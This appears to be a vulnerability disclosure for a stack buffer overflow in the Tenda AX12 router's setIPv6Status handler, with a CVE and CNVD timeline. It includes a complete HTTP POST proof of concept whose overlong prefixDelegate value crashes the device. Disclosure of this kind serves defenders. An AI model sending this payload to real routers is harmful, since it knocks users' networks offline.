# Tenda Router AX12 Vulnerability

This vulnerability lies in the `goform/setIPv6Status` page which influences the lastest version of Tenda Router AX12. (lastest version of this product is [V22.03.01.21_CN](https://www.tenda.com.cn/download/detail-3237.html))

## Vulnerability description

There is a stack buffer overflow vulnerability in function `sub_422CE4`

This function uses `strcpy` to copy the string pointed by `v6` into a stack buffer pointed by `v21`,while `v6` gets in a parameter called `prefixDelegate` and use that input value without any check.

![image-20220115010231776](1.png)

So when strcpy is called, a stack overflow occurs, the attacker can easily perform a **DoS Attack**.

## POC

```
POST /goform/setIPv6Status HTTP/1.1
Host: tendawifi.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 615
Connection: close
Referer: http://tendawifi.com/index.html

prefixDelegate=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

## Timeline

- 2021.12.19 report to CVE & CNVD
- 2022.01.07 CNVD ID assigned: CNVD-2022-01443
- 2022.02.10 CVE ID assigned : CVE-2021-45392
